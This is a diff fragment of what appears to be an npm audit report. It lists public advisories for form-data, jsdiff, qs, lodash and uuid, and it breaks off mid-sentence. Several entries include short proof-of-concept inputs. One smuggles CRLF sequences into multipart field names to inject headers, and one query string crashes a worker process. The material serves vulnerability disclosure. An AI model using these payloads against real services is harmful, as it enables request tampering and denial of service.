+        {
+          "version": "2.3.3",
+          "paths": [
+            "request>form-data"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-7783\n- https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0\n- https://github.com/benweissmann/CVE-2025-7783-poc\n- https://lists.debian.org/debian-lts-announce/2025/07/msg00023.html\n- https://github.com/advisories/GHSA-fjxv-7rqg-78g4",
+      "created": "2025-07-21T19:04:54.000Z",
+      "id": 1109540,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",
+      "reported_by": null,
+      "title": "form-data uses unsafe random function in form-data for choosing boundary",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-7783"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "form-data",
+      "vulnerable_versions": "<2.5.4",
+      "github_advisory_id": "GHSA-fjxv-7rqg-78g4",
+      "recommendation": "Upgrade to version 2.5.4 or later",
+      "patched_versions": ">=2.5.4",
+      "updated": "2025-11-03T21:34:09.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-330"
+      ],
+      "url": "https://github.com/advisories/GHSA-fjxv-7rqg-78g4"
+    },
+    "1112703": {
+      "findings": [
+        {
+          "version": "3.5.0",
+          "paths": [
+            "mocha>diff"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/kpdecker/jsdiff/security/advisories/GHSA-73rr-hh4g-fpgx\n- https://github.com/kpdecker/jsdiff/pull/649\n- https://github.com/kpdecker/jsdiff/commit/15a1585230748c8ae6f8274c202e0c87309142f5\n- https://github.com/kpdecker/jsdiff/issues/653\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24001\n- https://github.com/advisories/GHSA-73rr-hh4g-fpgx",
+      "created": "2026-01-14T21:34:12.000Z",
+      "id": 1112703,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nAttempting to parse a patch whose filename headers contain the line break characters `\\r`, `\\u2028`, or `\\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory.\n\nApplications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed).\n\nThe `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected.\n\nFinally, a second and lesser bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its \"leading garbage\"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse.\n\n### Patches\n\nAll vulnerabilities described are fixed in v8.0.3.\n\n### Workarounds\n\nIf using a version of jsdiff earlier than v8.0.3, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`.\n\n### References\n\nPR that fixed the bug: https://github.com/kpdecker/jsdiff/pull/649\n\n\n### CVE Notes\n\nNote that although the advisory describes two bugs, they each enable exactly the same attack vector (that an attacker who controls input to `parsePatch` can cause a DOS). Fixing one bug without fixing the other therefore does not fix the vulnerability and does not provide any security benefit. Therefore we assume that the bugs cannot possibly constitute Independently Fixable Vulnerabilities in the sense of CVE CNA rule 4.2.11, but rather that this advisory is properly construed under the rules as describing a single Vulnerability.",
+      "reported_by": null,
+      "title": "jsdiff has a Denial of Service vulnerability in parsePatch and applyPatch",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24001"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "diff",
+      "vulnerable_versions": "<3.5.1",
+      "github_advisory_id": "GHSA-73rr-hh4g-fpgx",
+      "recommendation": "Upgrade to version 3.5.1 or later",
+      "patched_versions": ">=3.5.1",
+      "updated": "2026-01-30T17:13:36.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-73rr-hh4g-fpgx"
+    },
+    "1113719": {
+      "findings": [
+        {
+          "version": "6.5.5",
+          "paths": [
+            "request>qs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p\n- https://nvd.nist.gov/vuln/detail/CVE-2025-15284\n- https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9\n- https://github.com/advisories/GHSA-6rw7-vpxm-498p",
+      "created": "2025-12-30T21:02:54.000Z",
+      "id": 1113719,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `arrayLimit` option in qs did not enforce limits for bracket notation (`a[]=1&a[]=2`), only for indexed notation (`a[0]=1`). This is a consistency bug; `arrayLimit` should apply uniformly across all array notations.\n\n**Note:** The default `parameterLimit` of 1000 effectively mitigates the DoS scenario originally described. With default options, bracket notation cannot produce arrays larger than `parameterLimit` regardless of `arrayLimit`, because each `a[]=value` consumes one parameter slot. The severity has been reduced accordingly.\n\n### Details\n\nThe `arrayLimit` option only checked limits for indexed notation (`a[0]=1&a[1]=2`) but did not enforce it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Note on parameterLimit interaction:** The original advisory's \"DoS demonstration\" claimed a length of 10,000, but `parameterLimit` (default: 1000) caps parsing to 1,000 parameters. With default options, the actual output is 1,000, not 10,000.\n\n### Impact\n\nConsistency bug in `arrayLimit` enforcement. With default `parameterLimit`, the practical DoS risk is negligible since `parameterLimit` already caps the total number of parsed parameters (and thus array elements from bracket notation). The risk increases only when `parameterLimit` is explicitly set to a very high value.",
+      "reported_by": null,
+      "title": "qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-15284"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": "<6.14.1",
+      "github_advisory_id": "GHSA-6rw7-vpxm-498p",
+      "recommendation": "Upgrade to version 6.14.1 or later",
+      "patched_versions": ">=6.14.1",
+      "updated": "2026-03-02T22:05:33.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-20"
+      ],
+      "url": "https://github.com/advisories/GHSA-6rw7-vpxm-498p"
+    },
+    "1115806": {
+      "findings": [
+        {
+          "version": "4.17.10",
+          "paths": [
+            "lodash"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-r5fr-rjxr-66jc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-4800\n- https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-35jh-r3h4-6jhm\n- https://github.com/advisories/GHSA-r5fr-rjxr-66jc",
+      "created": "2026-04-01T23:51:12.000Z",
+      "id": 1115806,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.\n\nWhen an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.\n\n### Patches\n\nUsers should upgrade to version 4.18.0.\n\nThe fix applies two changes:\n1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)\n2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated\n\n### Workarounds\n\nDo not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.",
+      "reported_by": null,
+      "title": "lodash vulnerable to Code Injection via `_.template` imports key names",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-4800"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=4.0.0 <=4.17.23",
+      "github_advisory_id": "GHSA-r5fr-rjxr-66jc",
+      "recommendation": "Upgrade to version 4.18.0 or later",
+      "patched_versions": ">=4.18.0",
+      "updated": "2026-04-01T23:51:13.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-r5fr-rjxr-66jc"
+    },
+    "1115810": {
+      "findings": [
+        {
+          "version": "4.17.10",
+          "paths": [
+            "lodash"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-f23m-r3pf-42rh\n- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2026-2950\n- https://github.com/advisories/GHSA-f23m-r3pf-42rh",
+      "created": "2026-04-01T23:50:27.000Z",
+      "id": 1115810,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\n### Patches\n\nThis issue is patched in 4.18.0.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "reported_by": null,
+      "title": "lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-2950"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "lodash",
+      "vulnerable_versions": "<=4.17.23",
+      "github_advisory_id": "GHSA-f23m-r3pf-42rh",
+      "recommendation": "Upgrade to version 4.18.0 or later",
+      "patched_versions": ">=4.18.0",
+      "updated": "2026-04-01T23:50:28.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-f23m-r3pf-42rh"
+    },
+    "1119441": {
+      "findings": [
+        {
+          "version": "3.4.0",
+          "paths": [
+            "request>uuid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq\n- https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34\n- https://github.com/uuidjs/uuid/releases/tag/v14.0.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41907\n- https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e\n- https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d\n- https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a\n- https://github.com/uuidjs/uuid/releases/tag/v11.1.1\n- https://github.com/uuidjs/uuid/releases/tag/v12.0.1\n- https://github.com/uuidjs/uuid/releases/tag/v13.0.1\n- https://github.com/advisories/GHSA-w5hq-g745-h8pq",
+      "created": "2026-04-22T20:53:24.000Z",
+      "id": 1119441,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+      "reported_by": null,
+      "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41907"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "uuid",
+      "vulnerable_versions": "<11.1.1",
+      "github_advisory_id": "GHSA-w5hq-g745-h8pq",
+      "recommendation": "Upgrade to version 11.1.1 or later",
+      "patched_versions": ">=11.1.1",
+      "updated": "2026-05-21T18:25:57.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-787",
+        "CWE-1285"
+      ],
+      "url": "https://github.com/advisories/GHSA-w5hq-g745-h8pq"
+    },
+    "1120370": {
+      "findings": [
+        {
+          "version": "4.17.10",
+          "paths": [
+            "lodash"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13465\n- https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81\n- https://cert-portal.siemens.com/productcert/html/ssa-253495.html\n- https://github.com/advisories/GHSA-xxjr-mmjv-4gpg",
+      "created": "2026-01-21T23:01:22.000Z",
+      "id": 1120370,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.",
+      "reported_by": null,
+      "title": "Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-13465"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=4.0.0 <=4.17.22",
+      "github_advisory_id": "GHSA-xxjr-mmjv-4gpg",
+      "recommendation": "Upgrade to version 4.17.23 or later",
+      "patched_versions": ">=4.17.23",
+      "updated": "2026-06-09T10:56:35.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-xxjr-mmjv-4gpg"
+    },
+    "1120745": {
+      "findings": [
+        {
+          "version": "2.3.3",
+          "paths": [
+            "request>form-data"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/form-data/form-data/security/advisories/GHSA-hmw2-7cc7-3qxx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-12143\n- https://github.com/form-data/form-data/commit/64190db548c0179e37206858e39f27cf513e9435\n- https://github.com/form-data/form-data/commit/be3f3cf553978bac15a5182f1f3c3d2d38ccf229\n- https://github.com/form-data/form-data/commit/c7133499c2ee1b80c678e411244f4442bf902045\n- https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data\n- https://www.npmjs.com/package/form-data\n- https://github.com/advisories/GHSA-hmw2-7cc7-3qxx",
+      "created": "2026-06-15T17:26:26.000Z",
+      "id": 1120745,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`form-data` builds `multipart/form-data` request bodies. Through v4.0.5, the `field` name passed to `FormData#append` and the `filename` option are concatenated directly into the `Content-Disposition` header with no escaping of CR (`\\r`), LF (`\\n`), or `\"`. An application that uses **untrusted input as a field name or filename** therefore lets an attacker terminate the header line and either inject additional headers or smuggle whole additional multipart parts into the request the application forwards to a backend.\n\nThis is CWE-93 (CRLF injection). It is a divergence from how browsers and the WHATWG HTML spec serialize form-data (they escape these characters), so the fix is to match that behavior. Severity is **conditional**: it depends on the consuming application passing attacker-controlled data as a field name or filename. Applications that only use fixed/trusted field names are not affected.\n\n## Details\n\nIn `lib/form_data.js`, `_multiPartHeader` builds the part header as:\n\n```javascript\n'Content-Disposition': ['form-data', 'name=\"' + field + '\"'].concat(contentDisposition || [])\n```\n\nand `_getContentDisposition` builds `filename=\"' + filename + '\"'`. Neither escapes control characters, so a `\\r\\n` in `field`/`filename` ends the header line. The same applies to `\"`, which can break out of the quoted parameter.\n\n### Proof of concept\n\n```javascript\nconst FormData = require('form-data');\nconst form = new FormData();\nform.append('email\"\\r\\nX-Injected: true\\r\\nfake=\"', 'user@example.com');\nconsole.log(form.getBuffer().toString());\n```\n\nBefore the fix this emits an injected `X-Injected: true` header line. A field name that also includes `--<boundary>` sequences can introduce additional parts (e.g. an extra `name=\"is_admin\"` field), which a downstream parser accepts as legitimate.\n\n## Impact\n\nFor an application that uses untrusted field names/filenames:\n\n- **Field injection / override (integrity).** Inject or override fields the backend trusts (e.g. `is_admin`, `role`) — the primary demonstrated impact.\n- **Header injection** into the generated multipart part.\n\nClaims of guaranteed privilege escalation, authentication bypass, high confidentiality impact, and availability impact are application-dependent downstream consequences, not properties of `form-data` itself, and are not demonstrated by the PoC.\n\n### Severity\n\nThe demonstrated, library-attributable impact is integrity (field/header injection); there is no demonstrated confidentiality disclosure or availability impact in `form-data` itself, and exploitation requires the consuming app to feed untrusted data into field names/filenames. A Moderate (≈5.3, `I:L`) rating is also defensible given that precondition.\n\n## Patch\n\nFixed in **4.0.6**, **3.0.5**, and **2.5.6**. Users on older 0.x/1.x/2.x releases should upgrade to 2.5.6 or later.\n\nThe fix escapes `\\r`, `\\n`, and `\"` as `%0D`, `%0A`, and `%22` in field names and filenames, matching the WHATWG HTML `multipart/form-data` encoding algorithm that browsers implement. This neutralizes the injection while leaving ordinary field names (including `name[0]`, dotted, and unicode names) unchanged.\n\n## Workaround\n\nUntil upgrading, validate or reject field names/filenames that contain control characters before calling `append`:\n\n```javascript\nif (/[\\r\\n]/.test(field)) { throw new Error('invalid field name'); }\n```\n\n## Credit\n\nReported by [yueyueL](https://github.com/yueyueL).",
+      "reported_by": null,
+      "title": "form-data: CRLF injection in form-data via unescaped multipart field names and filenames",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-12143"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "form-data",
+      "vulnerable_versions": "<2.5.6",
+      "github_advisory_id": "GHSA-hmw2-7cc7-3qxx",
+      "recommendation": "Upgrade to version 2.5.6 or later",
+      "patched_versions": ">=2.5.6",
+      "updated": "2026-06-15T17:26:27.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-93"
+      ],
+      "url": "https://github.com/advisories/GHSA-hmw2-7cc7-3qxx"
+    },
+    "1158507": {
+      "findings": [
+        {
+          "version": "6.5.5",
+          "paths": [
+            "request>qs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82417\n- https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6\n- https://github.com/advisories/GHSA-4mjr-xmp4-gh2g",
+      "created": "2026-09-02T14:45:13.000Z",
+      "id": 1158507,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` — the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` — worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse->stringify -> TypeError\nnode poc02_isBuffer.js                      # minimal defect -> TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -> uncaught throw -> exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check 